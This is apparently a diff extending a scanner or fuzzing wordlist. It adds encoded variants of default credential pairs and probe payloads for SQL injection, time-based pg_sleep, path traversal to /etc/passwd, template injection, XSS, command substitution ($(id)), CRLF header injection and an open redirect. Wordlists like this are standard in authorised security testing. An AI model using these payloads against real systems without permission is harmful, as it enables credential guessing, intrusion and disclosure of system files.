@@ -78,3 +78,164 @@ admin%3Apassword_1
 defaultcreds_1
 /defaultcreds/1
 admin:password%0a1
+admin%253Aadmin
+admin:admin?aurose=1
+admin:admin&aurose=1
+admin%253Apassword
+admin:password?aurose=1
+admin:password&aurose=1
+root%253Aroot
+root:root?aurose=1
+root:root&aurose=1
+test%253Atest
+test:test?aurose=1
+test:test&aurose=1
+guest%253Aguest
+guest:guest?aurose=1
+guest:guest&aurose=1
+administrator%253Aadministrator
+administrator:administrator?aurose=1
+administrator:administrator&aurose=1
+support:support
+support%3Asupport
+support%253Asupport
+SUPPORT:SUPPORT
+support:support?aurose=1
+support:support&aurose=1
+user%253Auser
+user:user?aurose=1
+user:user&aurose=1
+tomcat:tomcat
+tomcat%3Atomcat
+tomcat%253Atomcat
+TOMCAT:TOMCAT
+tomcat:tomcat?aurose=1
+tomcat:tomcat&aurose=1
+postgres:postgres
+postgres%3Apostgres
+postgres%253Apostgres
+POSTGRES:POSTGRES
+postgres:postgres?aurose=1
+postgres:postgres&aurose=1
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+admin:admin::var0
+admin%3Aadmin::v0
+/defaultcreds/probe/0
+admin:password::var1
+admin%3Apassword::v1
+/defaultcreds/probe/1
+root:root::var2
+root%3Aroot::v2
+/defaultcreds/probe/2
+test:test::var3
+test%3Atest::v3
+/defaultcreds/probe/3
+guest:guest::var4
+guest%3Aguest::v4
+/defaultcreds/probe/4
+administrator:administrator::var5
+administrator%3Aadministrator::v5
+/defaultcreds/probe/5
+support:support::var6
+support%3Asupport::v6
+/defaultcreds/probe/6
+user:user::var7
+user%3Auser::v7
+/defaultcreds/probe/7
+tomcat:tomcat::var8
+tomcat%3Atomcat::v8
+/defaultcreds/probe/8
+postgres:postgres::var9
+postgres%3Apostgres::v9
+/defaultcreds/probe/9
+' OR '1'='1::var10
+%27%20OR%20%271%27%3D%271::v10
+/defaultcreds/probe/10
+" OR "1"="1::var11
+%22%20OR%20%221%22%3D%221::v11
+/defaultcreds/probe/11
+' AND 1=1 --::var12
+%27%20AND%201%3D1%20--::v12
+/defaultcreds/probe/12
+' AND 1=2 --::var13
+%27%20AND%201%3D2%20--::v13
+/defaultcreds/probe/13
+../../../../etc/passwd::var14
+..%2F..%2F..%2F..%2Fetc%2Fpasswd::v14
+/defaultcreds/probe/14
